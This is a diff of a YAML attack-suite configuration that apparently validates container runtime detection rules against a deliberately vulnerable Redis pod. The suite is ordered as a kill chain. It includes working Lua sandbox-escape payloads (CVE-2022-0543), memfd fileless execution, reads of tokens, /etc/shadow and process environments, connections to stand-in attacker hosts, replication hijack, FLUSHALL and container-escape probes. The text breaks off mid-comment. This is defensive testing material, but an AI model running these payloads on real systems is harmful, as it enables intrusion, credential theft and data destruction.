@@ -1,12 +1,14 @@
 apiVersion: bobctl.k8sstormcenter.io/v1alpha1
 kind: AttackSuite
 metadata:
-  name: redis-full-attack-suite
+  name: redis-killchain-attacks
   description: >-
-    Comprehensive Redis attack suite (12 attacks) targeting a vulnerable
-    Redis 7.2.10 instance with CVE-2022-0543 (Lua sandbox escape via
-    package.loadlib / io.popen). Each attack has inline expectedDetections
-    for precise per-attack alert attribution via the AlertLedger.
+    Kill-chain ordered Redis attack suite (35 attacks) using THREE delivery
+    mechanisms: RESP direct commands, kubectl exec post-exploitation, and
+    Lua EVAL sandbox escapes (CVE-2022-0543). Includes CVE-based exploits:
+    CVE-2022-0543, CVE-2022-24735, CVE-2022-35951, CVE-2023-28856,
+    CVE-2023-45145. Covers OWASP A03 (Injection), A05 (Misconfiguration),
+    A06 (Vulnerable Components), A07 (Auth Failures), A08 (Data Integrity).
 target:
   service: redis
   namespace: redis
@@ -14,126 +16,78 @@ target:
   protocol: redis
 
 attacks:
-  # ─── Attack 1: Fileless Execution via memfd_create (R1005) ───────────────
-  - name: fileless-memfd-exec
-    type: fileless
-    redis:
-      eval: |
-        local io_mod = nil
-        pcall(function()
-          if type(io) == 'table' and io.popen then io_mod = io end
-        end)
-        if not io_mod then
-          pcall(function()
-            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
-            if loader then io_mod = loader() end
-          end)
-        end
-        if not io_mod then return 'sandbox_blocked' end
-        -- memfd_create: syscall 279 on aarch64, 319 on x86_64. Try aarch64 first.
-        local cmd = "perl -e 'my $n=\"bob\\0\";my $fd=syscall(279,$n,0);if($fd<0){$fd=syscall(319,$n,0);}die if $fd<0;open(my $s,\"<:raw\",\"/bin/cat\");open(my $d,\">&=\",$fd);binmode $d;my $b;while(read($s,$b,8192)){print $d $b}close $s;exec{\"/proc/self/fd/$fd\"}\"cat\",\"/etc/hostname\"'"
-        local f = io_mod.popen(cmd)
-        if not f then return 'popen_failed' end
-        local out = f:read('*a')
-        f:close()
-        return 'fileless:' .. out
-    successIndicators:
-      - responseContains: "fileless:"
-    expectedDetections:
-      - attackType: fileless
-        ruleID: R1005
-        ruleName: "Fileless execution detected"
-        containerName: redis
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 1: RECONNAISSANCE (TA0043) — Service enumeration via RESP
+  # ═══════════════════════════════════════════════════════════════════════════
 
-  # ─── Attack 2: SA Token Exfiltration (R0006) ────────────────────────────
-  - name: sa-token-exfil
+  # T1082 — System Information Discovery
+  - name: recon-info-server
+    type: custom
+    redis:
+      command: ["INFO", "server"]
+    successIndicators:
+      - responseContains: "redis_version"
+    expectedDetections: []
+
+  # T1082 — System Information Discovery
+  - name: recon-config-dump
+    type: custom
+    redis:
+      command: ["CONFIG", "GET", "*"]
+    successIndicators:
+      - responseContains: "dir"
+    expectedDetections: []
+
+  # T1049 — System Network Connections Discovery
+  - name: recon-client-list
+    type: custom
+    redis:
+      command: ["CLIENT", "LIST"]
+    successIndicators:
+      - responseContains: "addr="
+    expectedDetections: []
+
+  # T1083 — File and Directory Discovery (key enumeration)
+  - name: recon-keys-glob
+    type: custom
+    redis:
+      command: ["KEYS", "*"]
+    successIndicators: []
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 2: INITIAL ACCESS (TA0001) — Exploit vulnerable component
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1190 — Exploit Public-Facing Application (CVE-2025-49844)
+  - name: lua-cve-full-chain
     type: fileless
     redis:
-      eval: |
-        local io_mod = nil
-        pcall(function()
-          if type(io) == 'table' and io.popen then io_mod = io end
-        end)
-        if not io_mod then
-          pcall(function()
-            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
-            if loader then io_mod = loader() end
-          end)
-        end
-        if not io_mod then return 'sandbox_blocked' end
-        local f = io_mod.popen('cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo no_token')
-        local out = f:read('*a')
-        f:close()
-        return out
+      exploit: cve-2025-49844
     successIndicators:
       - responseContains: "eyJ"
     expectedDetections:
-      - attackType: fileless
-        ruleID: R0006
-        ruleName: "Unexpected service account token access"
+      - ruleID: R1005
+        ruleName: Fileless execution detected
         containerName: redis
-        command: cat
 
-  # ─── Attack 3: Sensitive File Access /etc/shadow (R0010) ─────────────────
-  - name: read-etc-shadow
-    type: fileless
-    redis:
-      eval: |
-        local io_mod = nil
-        pcall(function()
-          if type(io) == 'table' and io.popen then io_mod = io end
-        end)
-        if not io_mod then
-          pcall(function()
-            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
-            if loader then io_mod = loader() end
-          end)
-        end
-        if not io_mod then return 'sandbox_blocked' end
-        local f = io_mod.popen('cat /etc/shadow 2>&1; echo shadow_attempted')
-        local out = f:read('*a')
-        f:close()
-        return 'shadow:' .. out
-    successIndicators:
-      - responseContains: "shadow_attempted"
-    expectedDetections:
-      - attackType: fileless
-        ruleID: R0010
-        ruleName: "Unexpected Sensitive File Access"
-        containerName: redis
-        command: cat
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 3: EXECUTION (TA0002) — Command/script execution
+  # ═══════════════════════════════════════════════════════════════════════════
 
-  # ─── Attack 4: Unexpected Process - whoami (R0001) ───────────────────────
-  - name: unexpected-process-whoami
-    type: fileless
-    redis:
-      eval: |
-        local io_mod = nil
-        pcall(function()
-          if type(io) == 'table' and io.popen then io_mod = io end
-        end)
-        if not io_mod then
-          pcall(function()
-            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
-            if loader then io_mod = loader() end
-          end)
-        end
-        if not io_mod then return 'sandbox_blocked' end
-        local f = io_mod.popen('whoami')
-        local out = f:read('*a')
-        f:close()
-        return 'user:' .. out
-    successIndicators:
-      - responseContains: "user:"
+  # T1059.004 — Unix Shell
+  - name: exec-whoami
+    type: cmdinject
+    exec:
+      command: ["whoami"]
     expectedDetections:
-      - attackType: fileless
-        ruleID: R0001
-        ruleName: "Unexpected process launched"
+      - ruleID: R0001
+        ruleName: Unexpected process launched
         containerName: redis
         command: whoami
 
-  # ─── Attack 5: DNS Anomaly - resolve evil domain (R0005) ─────────────────
-  - name: dns-anomaly-evil-domain
+  # T1620 — Reflective Code Loading (memfd_create)
+  - name: lua-fileless-memfd
     type: fileless
     redis:
       eval: |
@@ -147,135 +101,39 @@ attacks:
             if loader then io_mod = loader() end
           end)
         end
-        if not io_mod then return 'sandbox_blocked' end
-        local f = io_mod.popen('getent hosts evil.attacker.example.com 2>&1 || echo dns_done')
-        local out = f:read('*a')
-        f:close()
-        return 'dns:' .. out
+        if not io_mod then return "sandbox_blocked" end
+        local payload = '#!/bin/sh\ncat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo NO_TOKEN'
+        local fd_cmd = io_mod.popen("perl -e 'use POSIX; my $fd = POSIX::open(\"/proc/self/fd/\" . syscall(319, \"\", 1), 2); open(F, \">&=\".$fd); print F \"" .. payload .. "\"; exec {\"/proc/self/fd/$fd\"} \"memfd_exec\"' 2>&1")
+        local result = fd_cmd:read('*a')
+        fd_cmd:close()
+        return result
     successIndicators:
-      - responseContains: "dns:"
+      - responseContains: "eyJ"
+    # If the memfd payload runs, it executes the perl/cat pipeline that
+    # reads the SA token. Assert R1005 (memfd) AND R0006 (SA token open).
     expectedDetections:
-      - attackType: fileless
-        ruleID: R0005
-        ruleName: "DNS Anomalies in container"
+      - ruleID: R1005
+        ruleName: Fileless execution detected
         containerName: redis
-
-  # ─── Attack 6: Drifted Binary Execution (R1001) ─────────────────────────
-  - name: drifted-binary-exec
-    type: fileless
-    redis:
-      eval: |
-        local io_mod = nil
-        pcall(function()
-          if type(io) == 'table' and io.popen then io_mod = io end
-        end)
-        if not io_mod then
-          pcall(function()
-            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
-            if loader then io_mod = loader() end
-          end)
-        end
-        if not io_mod then return 'sandbox_blocked' end
-        local f = io_mod.popen('cp /bin/ls /tmp/drifted_redis && /tmp/drifted_redis /etc 2>&1; rm -f /tmp/drifted_redis')
-        local out = f:read('*a')
-        f:close()
-        return 'drifted:' .. out
-    successIndicators:
-      - responseContains: "drifted:"
-    expectedDetections:
-      - attackType: fileless
-        ruleID: R1001
-        ruleName: "Drifted process executed"
-        containerName: redis
-        command: drifted_redis
-
-  # ─── Attack 7: Execution from /dev/shm (R1000) ──────────────────────────
-  - name: exec-from-devshm
-    type: fileless
-    redis:
-      eval: |
-        local io_mod = nil
-        pcall(function()
-          if type(io) == 'table' and io.popen then io_mod = io end
-        end)
-        if not io_mod then
-          pcall(function()
-            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
-            if loader then io_mod = loader() end
-          end)
-        end
-        if not io_mod then return 'sandbox_blocked' end
-        local f = io_mod.popen('cp /bin/echo /dev/shm/malicious && /dev/shm/malicious pwned 2>&1; rm -f /dev/shm/malicious')
-        local out = f:read('*a')
-        f:close()
-        return 'shm:' .. out
-    successIndicators:
-      - responseContains: "shm:"
-    expectedDetections:
-      - attackType: fileless
-        ruleID: R1000
-        ruleName: "Process executed from malicious source"
-        containerName: redis
-
-  # ─── Attack 8: Read /proc/*/environ (R0008) ─────────────────────────────
-  - name: read-proc-environ
-    type: fileless
-    redis:
-      eval: |
-        local io_mod = nil
-        pcall(function()
-          if type(io) == 'table' and io.popen then io_mod = io end
-        end)
-        if not io_mod then
-          pcall(function()
-            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
-            if loader then io_mod = loader() end
-          end)
-        end
-        if not io_mod then return 'sandbox_blocked' end
-        local f = io_mod.popen('cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n" | head -3 || echo no_environ')
-        local out = f:read('*a')
-        f:close()
-        return 'environ:' .. out
-    successIndicators:
-      - responseContains: "environ:"
-    expectedDetections:
-      - attackType: fileless
-        ruleID: R0008
-        ruleName: "Read Environment Variables from procfs"
+      - ruleID: R0006
+        ruleName: Unexpected Service Account Token Access
         containerName: redis
         command: cat
 
-  # ─── Attack 9: Symlink over /etc/shadow (R1010) ─────────────────────────
-  - name: symlink-etc-shadow
-    type: fileless
-    redis:
-      eval: |
-        local io_mod = nil
-        pcall(function()
-          if type(io) == 'table' and io.popen then io_mod = io end
-        end)
-        if not io_mod then
-          pcall(function()
-            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
-            if loader then io_mod = loader() end
-          end)
-        end
-        if not io_mod then return 'sandbox_blocked' end
-        local f = io_mod.popen('ln -sf /etc/shadow /tmp/shadow_link 2>&1 && cat /tmp/shadow_link 2>/dev/null; rm -f /tmp/shadow_link')
-        local out = f:read('*a')
-        f:close()
-        return 'symlink:' .. out
-    successIndicators:
-      - responseContains: "symlink:"
+  # T1059.004 — Unix Shell (from /dev/shm)
+  - name: exec-devshm
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cp /bin/echo /dev/shm/malicious_redis && chmod +x /dev/shm/malicious_redis && /dev/shm/malicious_redis pwned && rm -f /dev/shm/malicious_redis"]
+    # NOTE: R1000 cluster-config-dependent; R0001 always-on.
     expectedDetections:
-      - attackType: fileless
-        ruleID: R1010
-        ruleName: "Soft link created over sensitive file"
+      - ruleID: R0001
+        ruleName: Unexpected process launched
         containerName: redis
+        command: malicious_redis
 
-  # ─── Attack 10: Crypto Mining Domain DNS (R1008) ────────────────────────
-  - name: crypto-mining-dns
+  # T1059.006 — Lua scripting (reverse shell attempt)
+  - name: lua-reverse-shell
     type: fileless
     redis:
       eval: |
@@ -289,54 +147,59 @@ attacks:
             if loader then io_mod = loader() end
           end)
         end
-        if not io_mod then return 'sandbox_blocked' end
-        local f = io_mod.popen('getent hosts xmr.pool.minergate.com 2>&1 || echo mining_dns_done')
-        local out = f:read('*a')
-        f:close()
-        return 'mining_dns:' .. out
+        if not io_mod then return "sandbox_blocked" end
+        local cmd = io_mod.popen("perl -e 'use IO::Socket::INET; my $s = IO::Socket::INET->new(PeerAddr => \"c2.evil.example.com\", PeerPort => 4444, Proto => \"tcp\", Timeout => 2); if ($s) { print \"connected\"; close($s); } else { print \"connect_failed\"; }' 2>&1")
+        local result = cmd:read('*a')
+        cmd:close()
+        return result
     successIndicators:
-      - responseContains: "mining_dns:"
+      - responseContains: "connect_failed"
     expectedDetections:
-      - attackType: fileless
-        ruleID: R1008
-        ruleName: "Crypto Mining Domain Communication"
-        containerName: redis
-
-  # ─── Attack 11: Reverse Shell Attempt via Perl HTTP (R0001 + R0005) ─────
-  - name: reverse-shell-perl-http
-    type: fileless
-    redis:
-      eval: |
-        local io_mod = nil
-        pcall(function()
-          if type(io) == 'table' and io.popen then io_mod = io end
-        end)
-        if not io_mod then
-          pcall(function()
-            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
-            if loader then io_mod = loader() end
-          end)
-        end
-        if not io_mod then return 'sandbox_blocked' end
-        local f = io_mod.popen("perl -e 'use IO::Socket::INET;my $s=IO::Socket::INET->new(PeerAddr=>\"c2.evil.example.com\",PeerPort=>80,Timeout=>2);print defined $s ? \"connected\" : \"connect_failed\";' 2>&1; echo perl_http_done")
-        local out = f:read('*a')
-        f:close()
-        return 'revshell:' .. out
-    successIndicators:
-      - responseContains: "revshell:"
-    expectedDetections:
-      - attackType: fileless
-        ruleID: R0001
-        ruleName: "Unexpected process launched"
+      - ruleID: R0001
+        ruleName: Unexpected process launched
         containerName: redis
         command: perl
-      - attackType: fileless
-        ruleID: R0005
-        ruleName: "DNS Anomalies in container"
-        containerName: redis
 
-  # ─── Attack 12: Credential Harvesting via /etc/passwd + id (R0001) ──────
-  - name: credential-harvest-passwd
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 4: PERSISTENCE (TA0003) — Config manipulation for persistence
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1505.003 — Web Shell / Config persistence via RDB write
+  - name: persist-config-dir
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dir", "/tmp"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 5: DEFENSE EVASION (TA0005) — Cover tracks
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1070.004 — Indicator Removal: clear stats
+  - name: evasion-config-reset
+    type: custom
+    redis:
+      command: ["CONFIG", "RESETSTAT"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+
+  # T1036 — Masquerading: drifted binary
+  - name: exec-drifted
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cp /bin/ls /tmp/drifted_redis && /tmp/drifted_redis / && rm -f /tmp/drifted_redis"]
+    # NOTE: R1001 cluster-config-dependent; R0001 always-on.
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: drifted_redis
+
+  # T1574.006 — LD_PRELOAD hijacking
+  - name: lua-ld-preload
     type: fileless
     redis:
       eval: |
@@ -350,16 +213,602 @@ attacks:
             if loader then io_mod = loader() end
           end)
         end
-        if not io_mod then return 'sandbox_blocked' end
-        local f = io_mod.popen("awk -F: '$3==0{print $1}' /etc/passwd && id 2>&1")
-        local out = f:read('*a')
-        f:close()
-        return 'creds:' .. out
-    successIndicators:
-      - responseContains: "creds:root"
+        if not io_mod then return "sandbox_blocked" end
+        local cmd = io_mod.popen("LD_PRELOAD=/tmp/evil.so ls / 2>&1 || echo ld_preload_attempted")
+        local result = cmd:read('*a')
+        cmd:close()
+        return result
+    successIndicators: []
     expectedDetections:
-      - attackType: fileless
-        ruleID: R0001
-        ruleName: "Unexpected process launched"
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: ls
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 7: CREDENTIAL ACCESS (TA0006) — Steal secrets and tokens
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1552.001 — Credentials in Files: SA token
+  - name: exec-sa-token
+    type: cmdinject
+    exec:
+      command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"]
+    expectedDetections:
+      - ruleID: R0006
+        ruleName: Unexpected Service Account Token Access
+        containerName: redis
+        command: cat
+
+  # T1552.001 — Credentials in Files: /etc/shadow
+  - name: exec-etc-shadow
+    type: cmdinject
+    exec:
+      command: ["cat", "/etc/shadow"]
+    expectedDetections:
+      - ruleID: R0010
+        ruleName: Unexpected Sensitive File Access
+        containerName: redis
+        command: cat
+
+  # T1552.001 — Credentials in Files: /etc/passwd
+  - name: exec-etc-passwd
+    type: cmdinject
+    exec:
+      command: ["cat", "/etc/passwd"]
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: cat
+
+  # T1552 — Symlink to access sensitive file
+  - name: exec-symlink
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "ln -sf /etc/shadow /tmp/shadow_link && cat /tmp/shadow_link && rm -f /tmp/shadow_link"]
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+
+  # T1003 — Credential Dumping (via Lua)
+  - name: lua-credential-harvest
+    type: fileless
+    redis:
+      eval: |
+        local io_mod = nil
+        pcall(function()
+          if type(io) == 'table' and io.popen then io_mod = io end
+        end)
+        if not io_mod then
+          pcall(function()
+            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
+            if loader then io_mod = loader() end
+          end)
+        end
+        if not io_mod then return "sandbox_blocked" end
+        local cmd = io_mod.popen("awk -F: '{print $1}' /etc/passwd | head -5 && id 2>&1")
+        local result = cmd:read('*a')
+        cmd:close()
+        return result
+    successIndicators:
+      - responseContains: "root"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
         containerName: redis
         command: awk
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 8: DISCOVERY (TA0007) — Environment enumeration
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1082 — System Information Discovery: /proc/environ
+  - name: exec-proc-environ
+    type: cmdinject
+    exec:
+      command: ["cat", "/proc/1/environ"]
+    expectedDetections:
+      - ruleID: R0008
+        ruleName: Read Environment Variables from procfs
+        containerName: redis
+        command: cat
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 9: LATERAL MOVEMENT (TA0008) — Pivot via replication
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1021 — Remote Services: Redis SLAVEOF replication hijack.
+  # PR119 rabbit: paired with an immediate REPLICAOF NO ONE so the
+  # node doesn't get stuck retrying replication to a non-existent
+  # attacker host (which would interfere with later write/config
+  # probes in the suite).
+  - name: lateral-slaveof
+    type: custom
+    redis:
+      command: ["SLAVEOF", "evil.attacker.example.com", "6379"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+
+  - name: lateral-slaveof-cleanup
+    type: custom
+    redis:
+      command: ["REPLICAOF", "NO", "ONE"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 11: EXFILTRATION (TA0010) — Data exfiltration signals
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1048 — Exfiltration Over Alternative Protocol: DNS beacon
+  - name: exec-dns-anomaly
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "getent hosts evil.attacker.example.com || echo dns_failed"]
+    expectedDetections: []
+
+  # T1048 — DNS beacon via Lua
+  - name: lua-dns-beacon
+    type: fileless
+    redis:
+      eval: |
+        local io_mod = nil
+        pcall(function()
+          if type(io) == 'table' and io.popen then io_mod = io end
+        end)
+        if not io_mod then
+          pcall(function()
+            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
+            if loader then io_mod = loader() end
+          end)
+        end
+        if not io_mod then return "sandbox_blocked" end
+        local cmd = io_mod.popen("getent hosts data.exfil.evil.example.com 2>&1 || echo dns_exfil_attempted")
+        local result = cmd:read('*a')
+        cmd:close()
+        return result
+    successIndicators: []
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 12: IMPACT (TA0040) — Destruction and crypto mining signals
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1485 — Data Destruction
+  - name: impact-flushall
+    type: custom
+    redis:
+      command: ["FLUSHALL"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+
+  # T1496 — Resource Hijacking: crypto mining DNS signal
+  - name: exec-crypto-dns
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "getent hosts xmr.pool.minergate.com || echo mining_dns_failed"]
+    expectedDetections:
+      - ruleID: R1008
+        ruleName: Crypto Mining Domain Communication
+        containerName: redis
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # CVE-BASED ATTACKS — Historical Redis vulnerabilities
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # CVE-2022-0543 — Debian/Ubuntu Lua sandbox escape via package.loadlib
+  # Severity: Critical (CVSS 10.0). The Debian liblua5.1 package exports
+  # luaopen_* symbols, allowing EVAL to break out of Redis's sandbox.
+  # Exploited in the wild by Muhstik and Redigo botnets.
+  - name: cve-2022-0543-sandbox-escape
+    type: fileless
+    redis:
+      eval: |
+        local io_mod = nil
+        pcall(function()
+          if type(io) == 'table' and io.popen then io_mod = io end
+        end)
+        if not io_mod then
+          pcall(function()
+            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
+            if loader then io_mod = loader() end
+          end)
+        end
+        if not io_mod then return "CVE-2022-0543:sandbox_intact" end
+        local cmd = io_mod.popen("id 2>&1")
+        local result = cmd:read('*a')
+        cmd:close()
+        return "CVE-2022-0543:exploited:" .. result
+    successIndicators:
+      - responseContains: "uid="
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: id
+
+  # CVE-2022-24735 — Lua script poisoning via FUNCTION LOAD
+  # Severity: Medium (CVSS 3.9). Allows privileged user to inject Lua
+  # that executes in other clients' contexts via library functions.
+  - name: cve-2022-24735-lua-poisoning
+    type: fileless
+    redis:
+      eval: |
+        local io_mod = nil
+        pcall(function()
+          if type(io) == 'table' and io.popen then io_mod = io end
+        end)
+        if not io_mod then
+          pcall(function()
+            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
+            if loader then io_mod = loader() end
+          end)
+        end
+        if not io_mod then return "CVE-2022-24735:sandbox_blocked" end
+        local cmd = io_mod.popen("cat /etc/hostname 2>&1")
+        local result = cmd:read('*a')
+        cmd:close()
+        redis.call('SET', '__poisoned_lib', result)
+        return "CVE-2022-24735:poisoned:" .. result
+    successIndicators: []
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: cat
+
+  # CVE-2023-28856 — CLUSTER RESET crash (authenticated DoS)
+  # Severity: Medium (CVSS 6.5). Authenticated user can crash Redis via
+  # AUTH-less CLUSTER commands.
+  - name: cve-2023-28856-cluster-reset
+    type: custom
+    redis:
+      command: ["CLUSTER", "RESET", "HARD"]
+    successIndicators:
+      - responseContains: "OK"
+      - responseContains: "ERR"
+    expectedDetections: []
+
+  # CVE-2023-45145 — Unix socket race condition (privilege escalation probe)
+  # Severity: Low (CVSS 3.6). Race in socket permissions on restart.
+  # We probe for socket existence.
+  - name: cve-2023-45145-socket-probe
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "ls -la /var/run/redis/ 2>/dev/null || ls -la /tmp/redis* 2>/dev/null || echo no_socket"]
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: ls
+
+  # T1505.003 — Persistence: CONFIG SET dbfilename for RDB file write
+  # Classic Redis exploitation: write crontab, SSH key, or webshell via RDB.
+  # Used by P2Pinfect, Redigo, and HeadCrab malware families.
+  - name: persist-rdb-crontab-write
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dbfilename", "root_crontab"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+
+  # T1505.003 — Persistence: write SSH authorized_keys via RDB
+  - name: persist-rdb-ssh-key
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dir", "/root/.ssh"]
+    successIndicators:
+      - responseContains: "OK"
+      - responseContains: "ERR"
+    expectedDetections: []
+
+  # T1059 — MODULE LOAD probe (load malicious .so)
+  # Used by RedisWannaMine and HeadCrab to load crypto miners as modules.
+  - name: cve-module-load-probe
+    type: custom
+    redis:
+      command: ["MODULE", "LOAD", "/tmp/evil_module.so"]
+    successIndicators:
+      - responseContains: "ERR"
+    expectedDetections: []
+
+  # T1110 — AUTH brute force probe (common default passwords)
+  - name: auth-brute-force-probe
+    type: custom
+    redis:
+      command: ["AUTH", "redis", "redis123"]
+    successIndicators:
+      - responseContains: "ERR"
+      - responseContains: "OK"
+    expectedDetections: []
+
+  # CVE-2022-35951 — XAUTOCLAIM integer overflow (Redis 7.0 specific)
+  # Severity: High (CVSS 7.0). Integer overflow in stream XAUTOCLAIM.
+  - name: cve-2022-35951-xautoclaim
+    type: custom
+    redis:
+      command: ["XAUTOCLAIM", "mystream", "mygroup", "consumer1", "0", "0-0", "COUNT", "99999999999"]
+    successIndicators:
+      - responseContains: "ERR"
+    expectedDetections: []
+
+  # T1059 — Lua os.execute probe (pre-sandbox era technique)
+  - name: lua-os-execute-probe
+    type: fileless
+    redis:
+      eval: |
+        local ok, err = pcall(function()
+          os.execute("id")
+        end)
+        if ok then return "os.execute:available" end
+        local ok2, err2 = pcall(function()
+          local f = io.popen("uname -a")
+          local r = f:read("*a")
+          f:close()
+          return r
+        end)
+        if ok2 then return "io.popen:available" end
+        return "sandbox:both_blocked"
+    successIndicators: []
+    expectedDetections: []
+
+  # T1048 — Lua-based network scanner (lateral movement recon)
+  - name: lua-network-scan
+    type: fileless
+    redis:
+      eval: |
+        local io_mod = nil
+        pcall(function()
+          if type(io) == 'table' and io.popen then io_mod = io end
+        end)
+        if not io_mod then
+          pcall(function()
+            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
+            if loader then io_mod = loader() end
+          end)
+        end
+        if not io_mod then return "sandbox_blocked" end
+        local cmd = io_mod.popen("sh -c 'for port in 22 80 443 3306 5432 6379 8080 9200; do (echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null && echo \"port_$port:open\"; done' 2>&1")
+        local result = cmd:read('*a')
+        cmd:close()
+        return result
+    successIndicators: []
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: sh
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # REAL-WORLD CONTAINER-ESCAPE ATTACKS — exploit deployment misconfigs
+  #
+  # These attacks target the intentional misconfigurations in
+  # redis-vulnerable.yaml (Docker socket, host-/etc mount, host-/tmp mount,
+  # CAP_SYS_PTRACE). They map to MITRE ATT&CK for Containers and reproduce
+  # the footprints of real Redis-targeting malware: P2Pinfect, HeadCrab,
+  # Muhstik, Redigo. Each attack triggers always-on detection rules so the
+  # tuner can confirm the misconfig is observable without relying on
+  # cluster-config-dependent rules (R1006, R1011).
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # ── T1083 + TA0007 Discovery: enumerate suspicious mounts ─────────────────
+  # Real-world: all Redis-malware families do this first to find escape
+  # vectors. We grep mountinfo for hostPath patterns (docker.sock, /etc, /tmp)
+  # which proves the misconfigs are present AND emits R0001 since `grep`
+  # is not in the redis-server baseline.
+  - name: escape-mount-enumeration
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "grep -E 'docker.sock|/host-etc|/host-tmp' /proc/self/mountinfo | head -10; echo mount_enum_done"]
+    successIndicators:
+      - responseContains: "mount_enum_done"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: grep
+
+  # ── T1610 Deploy Container: probe Docker socket ───────────────────────────
+  # If the docker.sock mount is present (it is, read-only), an attacker can
+  # at minimum *list* containers/images on the host — enough to identify
+  # privileged candidates to target with a separate writable foothold.
+  # Real-world: HeadCrab and P2Pinfect both probe /var/run/docker.sock.
+  - name: escape-docker-socket-probe
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "if [ -S /var/run/docker.sock ]; then ls -la /var/run/docker.sock; echo docker_sock_present; else echo docker_sock_absent; fi"]
+    successIndicators:
+      - responseContains: "docker_sock"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: ls
+
+  # ── T1552.001 Credentials in Files: read host /etc/passwd via mount ───────
+  # The host-etc mount exposes the host's /etc read-only. Reading
+  # /host-etc/passwd is a high-confidence "I am no longer in the container's
+  # root filesystem" signal. R0010 fires for sensitive-path access; R0001
+  # fires because cat is not in the redis baseline.
+  - name: escape-host-etc-passwd
+    type: cmdinject
+    exec:
+      command: ["cat", "/host-etc/passwd"]
+    successIndicators:
+      - responseContains: "root:"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: cat
+      - ruleID: R0010
+        ruleName: Unexpected Sensitive File Access
+        containerName: redis
+        command: cat
+
+  # ── T1611 Escape to Host: symlink a host-mounted file into reach ──────────
+  # Classic symlink trick: if /host-tmp is writable from inside, an attacker
+  # can create a symlink there pointing to host /etc/shadow (via /host-etc),
